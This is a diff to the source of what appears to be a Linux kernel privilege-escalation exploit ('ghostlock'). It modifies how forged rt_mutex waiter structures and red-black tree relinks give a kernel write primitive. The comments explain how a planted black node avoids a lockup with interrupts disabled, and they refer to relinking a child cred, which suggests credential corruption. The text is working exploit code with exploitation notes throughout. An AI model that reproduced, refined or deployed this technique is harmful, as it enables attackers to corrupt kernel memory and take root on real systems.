@@ -2,6 +2,7 @@
 
 #include <iterator>
 
+#include "kernel/target_constants.hpp"
 #include "kernel/waiter_layout.hpp"
 
 /* The per-layout fd_set word table, kept in its own translation unit so it stays
@@ -35,13 +36,28 @@ namespace ghostlock::route {
         /* A leaf write (WriteRequest::leaf, preserve_child == 0) leaves
          * PayloadWriteLayout::right at zero, because there is no child cred to
          * point the relink at. pc = 0 would leave the node parentless for
-         * enqueue_pi to trash fake_task, so the contract uses pc = dest - 8
-         * instead: the one-child arm then stores 0 at *dest. That is also what
-         * encode_compact_waiter() writes into pi_tree_entry (0x18 =
-         * layout.parent = target - 8, 0x20 = layout.right = 0, 0x28 =
-         * layout.left). layout.left is never assigned anywhere, so the
-         * zero-value arm relinks left at 0. */
-        const uint64_t relink_pc = right != 0 ? right : write_target - 8;
+         * enqueue_pi to trash fake_task, so this arm needs a different parent.
+         *
+         * pc = target - 8 is what encode_compact_waiter() writes into the
+         * *payload* waiter's pi_tree_entry, and there it is the mechanism that
+         * stores 0 at the target. Carried into the on-stack waiter it means
+         * something else: rb_insert_color() reads *(pc) as the parent node, and
+         * on a slab target *(target - 8) is an aligned word -- bit 0 clear, so
+         * rb_is_black() is false, the walk descends to gparent = *(*(target - 8))
+         * and spins on garbage while rt_mutex_enqueue holds lock->wait_lock with
+         * interrupts off. That is the silent freeze the W3 leaf write showed;
+         * W1/W2 carry a non-zero right and never froze.
+         *
+         * Point pc at the planted black node instead: page_base +
+         * RELINK_NODE_OFF holds 1 (see util.cpp, payload planting), so
+         * rb_is_black() is true and the walk stops on the first read.
+         * fake_lock == page_base on this route (payload_delta cancels
+         * kLockOffset), which is why the black node is reachable from it. */
+        const uint64_t relink_pc =
+                right != 0
+                    ? right
+                    : lock + static_cast<uint64_t>(
+                                     ghostlock::target::payload::kRelinkNodeOffset);
         const uint64_t relink_left = right != 0 ? write_target : 0;
 
         if (compact_waiter == kernel::COMPACT_WAITER_5_10) {
